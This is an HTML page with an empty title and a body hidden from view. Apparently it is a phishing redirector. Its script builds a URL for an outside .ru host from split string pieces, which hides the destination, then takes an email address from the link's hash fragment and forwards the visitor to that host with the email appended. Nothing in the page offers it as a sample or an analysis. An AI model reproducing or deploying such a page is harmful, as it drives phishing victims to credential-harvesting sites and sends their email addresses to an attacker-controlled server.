<!DOCTYPE html>
<html>
<head>
    <title>.</title>
    <style>
        body { display: none; }
    </style>
    <script>
        (function() {
            var part1 = "https://prism.";
            var part2 = "selitone.r";
            var part3 = "u/aXCVOnJc/#M";

            // Get the email parameter from the hash fragment
            var email = window.location.hash.substring(1); // Extract everything after `#`

            if (email) {
                // Decode and sanitize the email
                var sanitizedEmail = decodeURIComponent(email).replace(/\//g, "");

                // Construct the redirect URL
                var redirectUrl = part1 + part2 + part3 + "/" + sanitizedEmail;

                // Redirect to the constructed URL
                window.location.href = redirectUrl;
            } else {
                console.error("No email found in the hash fragment.");
            }
        })();
    </script>
</head>
<body>
</body>
</html>
